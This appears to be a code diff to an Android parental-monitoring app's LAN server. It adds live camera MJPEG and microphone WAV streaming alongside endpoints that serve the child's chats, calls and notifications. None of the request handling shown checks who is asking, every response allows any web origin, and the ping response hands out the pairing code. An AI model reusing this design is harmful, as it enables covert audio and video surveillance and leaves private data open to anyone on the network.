@@ -4,6 +4,7 @@ import android.content.Context
 import android.net.wifi.WifiManager
 import android.util.Log
 import com.google.gson.Gson
+import com.vyra.kids.services.LiveAudioStreamService
 import kotlinx.coroutines.*
 import java.io.BufferedReader
 import java.io.InputStreamReader
@@ -11,9 +12,20 @@ import java.io.OutputStream
 import java.net.*
 
 /**
- * Lightweight, zero-dependency Local LAN Sync Server and UDP Broadcaster.
- * Enables zero-quota, high-speed direct peer-to-peer data syncing whenever
- * Parent and Child devices are connected to the same Wi-Fi network.
+ * Lightweight Local LAN Sync Server + Live MJPEG Camera + Live WAV Audio streaming.
+ *
+ * HTTP Endpoints:
+ *   GET /api/ping            → JSON health check
+ *   GET /api/sync            → Full rolling data dump
+ *   GET /api/status          → Device status
+ *   GET /api/chats           → Chat messages
+ *   GET /api/calls           → Call records
+ *   GET /api/notifications   → Notifications
+ *   GET /api/stream          → SSE push stream (real-time events)
+ *   GET /api/camera-frame    → Single JPEG snapshot (one-shot, ~15ms)
+ *   GET /api/camera-mjpeg    → Live MJPEG stream (multipart/x-mixed-replace)
+ *   GET /api/live-audio      → Live WAV stream (audio/wav, streaming PCM)
+ *   POST /api/command        → Remote command dispatch from parent
  */
 class LocalLanSyncServer private constructor(private val context: Context) {
 
@@ -36,6 +48,9 @@ class LocalLanSyncServer private constructor(private val context: Context) {
                 instance ?: LocalLanSyncServer(context.applicationContext).also { instance = it }
             }
         }
+
+        // MJPEG boundary string
+        private const val MJPEG_BOUNDARY = "vyraframe"
     }
 
     fun broadcastLiveEvent(eventType: String, data: Map<String, Any>) {
@@ -48,7 +63,6 @@ class LocalLanSyncServer private constructor(private val context: Context) {
                     "timestamp" to System.currentTimeMillis()
                 ))
                 val msg = "data: $payload\n\n".toByteArray(Charsets.UTF_8)
-
                 synchronized(activeStreamClients) {
                     val iterator = activeStreamClients.iterator()
                     while (iterator.hasNext()) {
@@ -77,8 +91,7 @@ class LocalLanSyncServer private constructor(private val context: Context) {
     fun start() {
         if (isRunning) return
         isRunning = true
-        Log.i(AppConstants.TAG, "Starting Local LAN Sync Server on port $HTTP_PORT...")
-
+        Log.i(AppConstants.TAG, "LAN Sync Server starting on port $HTTP_PORT …")
         scope.launch { startHttpServer() }
         scope.launch { startUdpDiscoveryListener() }
     }
@@ -86,18 +99,13 @@ class LocalLanSyncServer private constructor(private val context: Context) {
     @Synchronized
     fun stop() {
         isRunning = false
-        try {
-            if (multicastLock?.isHeld == true) {
-                multicastLock?.release()
-            }
-        } catch (_: Exception) {}
-        try {
-            serverSocket?.close()
-            udpSocket?.close()
-        } catch (_: Exception) {}
+        try { if (multicastLock?.isHeld == true) multicastLock?.release() } catch (_: Exception) {}
+        try { serverSocket?.close(); udpSocket?.close() } catch (_: Exception) {}
         scope.cancel()
-        Log.i(AppConstants.TAG, "Stopped Local LAN Sync Server")
+        Log.i(AppConstants.TAG, "LAN Sync Server stopped")
     }
+
+    // ──────────────────────────────── HTTP Server ────────────────────────────────
 
     private fun startHttpServer() {
         try {
@@ -111,7 +119,7 @@ class LocalLanSyncServer private constructor(private val context: Context) {
                 }
             }
         } catch (e: Exception) {
-            Log.e(AppConstants.TAG, "Error in HTTP LAN Server", e)
+            Log.e(AppConstants.TAG, "HTTP server error", e)
         }
     }
 
@@ -123,9 +131,23 @@ class LocalLanSyncServer private constructor(private val context: Context) {
             val parts = firstLine.split(" ")
             if (parts.size < 2) return
 
-            val method = parts[0]
             val uri = parts[1]
 
+            // ── Live MJPEG camera stream ──────────────────────────────────────────
+            if (uri.startsWith("/api/camera-mjpeg")) {
+                client.soTimeout = 0
+                streamMjpeg(client)
+                return
+            }
+
+            // ── Live WAV audio stream ─────────────────────────────────────────────
+            if (uri.startsWith("/api/live-audio")) {
+                client.soTimeout = 0
+                streamLiveAudio(client)
+                return
+            }
+
+            // ── SSE real-time event stream ────────────────────────────────────────
             if (uri.startsWith("/api/stream")) {
                 client.soTimeout = 0
                 val os = client.getOutputStream()
@@ -135,25 +157,18 @@ class LocalLanSyncServer private constructor(private val context: Context) {
                         "Connection: keep-alive\r\n" +
                         "Access-Control-Allow-Origin: *\r\n\r\n"
                 os.write(sseHeader.toByteArray(Charsets.UTF_8))
-                os.flush()
-
-                // Initial handshake event
-                val handshake = "data: " + gson.toJson(mapOf("type" to "connected", "code" to pairingCode, "device" to android.os.Build.MODEL)) + "\n\n"
+                val handshake = "data: " + gson.toJson(
+                    mapOf("type" to "connected", "code" to pairingCode, "device" to android.os.Build.MODEL)
+                ) + "\n\n"
                 os.write(handshake.toByteArray(Charsets.UTF_8))
                 os.flush()
-
                 activeStreamClients.add(client)
-                Log.i(AppConstants.TAG, "Client connected to real-time LAN push stream: ${client.inetAddress.hostAddress}")
-
+                Log.i(AppConstants.TAG, "SSE client connected: ${client.inetAddress.hostAddress}")
                 try {
                     while (isRunning && !client.isClosed) {
                         delay(15000)
-                        try {
-                            os.write(": keepalive\n\n".toByteArray(Charsets.UTF_8))
-                            os.flush()
-                        } catch (_: Exception) {
-                            break
-                        }
+                        try { os.write(": keepalive\n\n".toByteArray(Charsets.UTF_8)); os.flush() }
+                        catch (_: Exception) { break }
                     }
                 } finally {
                     activeStreamClients.remove(client)
@@ -162,67 +177,241 @@ class LocalLanSyncServer private constructor(private val context: Context) {
                 return
             }
 
+            // ── REST endpoints ────────────────────────────────────────────────────
             val localData = LocalDataManager.getInstance(context)
-            val responseBody: String
             val statusCode: Int
+            val responseBody: String
 
             when {
                 uri.startsWith("/api/ping") -> {
                     statusCode = 200
-                    responseBody = gson.toJson(mapOf("status" to "ok", "code" to pairingCode, "device" to android.os.Build.MODEL))
+                    responseBody = gson.toJson(mapOf(
+                        "status" to "ok",
+                        "code" to pairingCode,
+                        "device" to android.os.Build.MODEL,
+                        "cameraActive" to CameraFrameBuffer.isActive,
+                        "audioActive" to AudioChunkBuffer.isActive
+                    ))
                 }
                 uri.startsWith("/api/sync") -> {
-                    statusCode = 200
-                    responseBody = gson.toJson(localData.getAllData())
+                    statusCode = 200; responseBody = gson.toJson(localData.getAllData())
                 }
                 uri.startsWith("/api/status") -> {
-                    statusCode = 200
-                    responseBody = gson.toJson(localData.getStatus())
+                    statusCode = 200; responseBody = gson.toJson(localData.getStatus())
                 }
                 uri.startsWith("/api/chats") -> {
-                    statusCode = 200
-                    responseBody = gson.toJson(localData.getChats())
+                    statusCode = 200; responseBody = gson.toJson(localData.getChats())
                 }
                 uri.startsWith("/api/calls") -> {
-                    statusCode = 200
-                    responseBody = gson.toJson(localData.getCalls())
+                    statusCode = 200; responseBody = gson.toJson(localData.getCalls())
                 }
                 uri.startsWith("/api/notifications") -> {
-                    statusCode = 200
-                    responseBody = gson.toJson(localData.getNotifications())
+                    statusCode = 200; responseBody = gson.toJson(localData.getNotifications())
+                }
+                // Single JPEG snapshot — parent polls this at ~10 FPS for camera feed
+                uri.startsWith("/api/camera-frame") -> {
+                    val frame = CameraFrameBuffer.getFrame()
+                    if (frame != null) {
+                        writeJpegResponse(client, frame)
+                        return
+                    } else {
+                        statusCode = 503
+                        responseBody = "{\"error\":\"Camera not active. Send START_CAMERA command first.\"}"
+                    }
                 }
                 else -> {
-                    statusCode = 404
-                    responseBody = "{\"error\":\"Not Found\"}"
+                    statusCode = 404; responseBody = "{\"error\":\"Not Found\"}"
                 }
             }
 
-            val bodyBytes = responseBody.toByteArray(Charsets.UTF_8)
+            writeJsonResponse(client, statusCode, responseBody)
+        } catch (e: Exception) {
+            Log.w(AppConstants.TAG, "LAN client error", e)
+        }
+    }
+
+    // ──────────────────────── Live MJPEG Camera Stream ───────────────────────────
+
+    /**
+     * Serves a continuous multipart/x-mixed-replace MJPEG stream.
+     * Parent uses Image.memory() updated per frame — like a WhatsApp video call feed.
+     * Frame rate: ~10–15 FPS depending on Camera2 capture speed + network bandwidth.
+     */
+    private suspend fun streamMjpeg(client: Socket) {
+        val os = client.getOutputStream()
+        try {
+            val header = "HTTP/1.1 200 OK\r\n" +
+                    "Content-Type: multipart/x-mixed-replace; boundary=$MJPEG_BOUNDARY\r\n" +
+                    "Cache-Control: no-cache, no-store, must-revalidate\r\n" +
+                    "Access-Control-Allow-Origin: *\r\n" +
+                    "Connection: keep-alive\r\n\r\n"
+            os.write(header.toByteArray(Charsets.UTF_8))
+            os.flush()
+
+            Log.i(AppConstants.TAG, "MJPEG stream started for ${client.inetAddress.hostAddress}")
+
+            var lastFrameTs = 0L
+            while (isRunning && !client.isClosed) {
+                val frame = CameraFrameBuffer.getFrame()
+                if (frame != null && CameraFrameBuffer.lastFrameTimestampMs > lastFrameTs) {
+                    lastFrameTs = CameraFrameBuffer.lastFrameTimestampMs
+                    try {
+                        val partHeader = "--$MJPEG_BOUNDARY\r\n" +
+                                "Content-Type: image/jpeg\r\n" +
+                                "Content-Length: ${frame.size}\r\n\r\n"
+                        os.write(partHeader.toByteArray(Charsets.UTF_8))
+                        os.write(frame)
+                        os.write("\r\n".toByteArray(Charsets.UTF_8))
+                        os.flush()
+                    } catch (e: Exception) {
+                        break   // client disconnected
+                    }
+                } else {
+                    delay(33)   // ~30 FPS polling of the frame buffer
+                }
+            }
+        } catch (e: Exception) {
+            Log.w(AppConstants.TAG, "MJPEG stream ended: ${e.message}")
+        } finally {
+            try { client.close() } catch (_: Exception) {}
+            Log.i(AppConstants.TAG, "MJPEG stream closed")
+        }
+    }
+
+    // ──────────────────────────── Live WAV Audio Stream ──────────────────────────
+
+    /**
+     * Streams a continuous WAV-over-HTTP audio response.
+     * Writes a valid WAV header with 0x7FFFFFFF data size (streaming mode),
+     * then continuously writes PCM chunks from AudioChunkBuffer.
+     * Parent's audioplayers plays the URL → live listen, ~200ms latency.
+     */
+    private suspend fun streamLiveAudio(client: Socket) {
+        val os = client.getOutputStream()
+        try {
+            val httpHeader = "HTTP/1.1 200 OK\r\n" +
+                    "Content-Type: audio/wav\r\n" +
+                    "Cache-Control: no-cache\r\n" +
+                    "Access-Control-Allow-Origin: *\r\n" +
+                    "Connection: keep-alive\r\n\r\n"
+            os.write(httpHeader.toByteArray(Charsets.UTF_8))
+
+            // Write WAV header in streaming mode (sizes = 0x7FFFFFFF = unknown/max)
+            os.write(buildWavStreamHeader(
+                sampleRate = LiveAudioStreamService.SAMPLE_RATE,
+                channels = 1,
+                bitsPerSample = 16
+            ))
+            os.flush()
+
+            Log.i(AppConstants.TAG, "Live WAV audio stream started for ${client.inetAddress.hostAddress}")
+
+            while (isRunning && !client.isClosed) {
+                val chunk = AudioChunkBuffer.poll(250L)
+                if (chunk != null) {
+                    try {
+                        os.write(chunk)
+                        os.flush()
+                    } catch (e: Exception) {
+                        break   // client disconnected
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.w(AppConstants.TAG, "Live audio stream ended: ${e.message}")
+        } finally {
+            try { client.close() } catch (_: Exception) {}
+            Log.i(AppConstants.TAG, "Live audio stream closed")
+        }
+    }
+
+    /**
+     * Builds a 44-byte WAV header suitable for streaming (unknown total length).
+     * Uses 0x7FFFFFFF for both RIFF chunk size and data chunk size.
+     */
+    private fun buildWavStreamHeader(sampleRate: Int, channels: Int, bitsPerSample: Int): ByteArray {
+        val h = ByteArray(44)
+
+        fun putInt(offset: Int, v: Int) {
+            h[offset]   = (v and 0xFF).toByte()
+            h[offset+1] = ((v shr 8) and 0xFF).toByte()
+            h[offset+2] = ((v shr 16) and 0xFF).toByte()
+            h[offset+3] = ((v shr 24) and 0xFF).toByte()
+        }
+        fun putShort(offset: Int, v: Int) {
+            h[offset]   = (v and 0xFF).toByte()
+            h[offset+1] = ((v shr 8) and 0xFF).toByte()
+        }
+
+        // RIFF chunk
+        h[0]='R'.code.toByte(); h[1]='I'.code.toByte(); h[2]='F'.code.toByte(); h[3]='F'.code.toByte()
+        putInt(4, 0x7FFFFFFF)   // streaming: unknown total size
+        h[8]='W'.code.toByte(); h[9]='A'.code.toByte(); h[10]='V'.code.toByte(); h[11]='E'.code.toByte()
+
+        // fmt sub-chunk
+        h[12]='f'.code.toByte(); h[13]='m'.code.toByte(); h[14]='t'.code.toByte(); h[15]=' '.code.toByte()
+        putInt(16, 16)           // PCM fmt size
+        putShort(20, 1)          // PCM = 1
+        putShort(22, channels)
+        putInt(24, sampleRate)
+        putInt(28, sampleRate * channels * bitsPerSample / 8)  // byte rate
+        putShort(32, channels * bitsPerSample / 8)             // block align
+        putShort(34, bitsPerSample)
+
+        // data sub-chunk
+        h[36]='d'.code.toByte(); h[37]='a'.code.toByte(); h[38]='t'.code.toByte(); h[39]='a'.code.toByte()
+        putInt(40, 0x7FFFFFFF)   // streaming: unknown data size
+
+        return h
+    }
+
+    // ─────────────────────── HTTP Response Helpers ───────────────────────────────
+
+    private fun writeJpegResponse(client: Socket, jpegBytes: ByteArray) {
+        try {
+            val os = client.getOutputStream()
+            val header = "HTTP/1.1 200 OK\r\n" +
+                    "Content-Type: image/jpeg\r\n" +
+                    "Content-Length: ${jpegBytes.size}\r\n" +
+                    "Cache-Control: no-cache\r\n" +
+                    "Access-Control-Allow-Origin: *\r\n" +
+                    "Connection: close\r\n\r\n"
+            os.write(header.toByteArray(Charsets.UTF_8))
+            os.write(jpegBytes)
+            os.flush()
+            client.close()
+        } catch (e: Exception) {
+            Log.w(AppConstants.TAG, "writeJpegResponse error", e)
+        }
+    }
+
+    private fun writeJsonResponse(client: Socket, statusCode: Int, body: String) {
+        try {
+            val bodyBytes = body.toByteArray(Charsets.UTF_8)
             val os: OutputStream = client.getOutputStream()
             val header = "HTTP/1.1 $statusCode OK\r\n" +
                     "Content-Type: application/json; charset=utf-8\r\n" +
                     "Content-Length: ${bodyBytes.size}\r\n" +
                     "Access-Control-Allow-Origin: *\r\n" +
                     "Connection: close\r\n\r\n"
-
             os.write(header.toByteArray(Charsets.UTF_8))
             os.write(bodyBytes)
             os.flush()
             client.close()
         } catch (e: Exception) {
-            Log.w(AppConstants.TAG, "LAN client handle error", e)
+            Log.w(AppConstants.TAG, "writeJsonResponse error", e)
         }
     }
+
+    // ────────────────────────── UDP Discovery ────────────────────────────────────
 
     private fun startUdpDiscoveryListener() {
         try {
             udpSocket = DatagramSocket(UDP_DISCOVERY_PORT)
             val buffer = ByteArray(1024)
-
             while (isRunning) {
                 val packet = DatagramPacket(buffer, buffer.size)
                 udpSocket?.receive(packet)
-
                 val message = String(packet.data, 0, packet.length).trim()
                 if (message.contains("VYRA_DISCOVER") || message.contains(pairingCode)) {
                     val localIp = getLocalIpAddress()
@@ -234,20 +423,12 @@ class LocalLanSyncServer private constructor(private val context: Context) {
                         "model" to android.os.Build.MODEL
                     ))
                     val replyBytes = reply.toByteArray(Charsets.UTF_8)
-                    val responsePacket = DatagramPacket(
-                        replyBytes,
-                        replyBytes.size,
-                        packet.address,
-                        packet.port
-                    )
-                    udpSocket?.send(responsePacket)
-                    Log.d(AppConstants.TAG, "Responded to LAN discovery probe from ${packet.address.hostAddress}")
+                    udpSocket?.send(DatagramPacket(replyBytes, replyBytes.size, packet.address, packet.port))
+                    Log.d(AppConstants.TAG, "Responded to LAN discovery from ${packet.address.hostAddress}")
                 }
             }
         } catch (e: Exception) {
-            if (isRunning) {
-                Log.e(AppConstants.TAG, "Error in UDP discovery listener", e)
-            }
+            if (isRunning) Log.e(AppConstants.TAG, "UDP discovery error", e)
         }
     }
 
@@ -257,9 +438,8 @@ class LocalLanSyncServer private constructor(private val context: Context) {
             for (intf in interfaces) {
                 val addrs = java.util.Collections.list(intf.inetAddresses)
                 for (addr in addrs) {
-                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
+                    if (!addr.isLoopbackAddress && addr is Inet4Address)
                         return addr.hostAddress ?: "127.0.0.1"
-                    }
                 }
             }
         } catch (_: Exception) {}
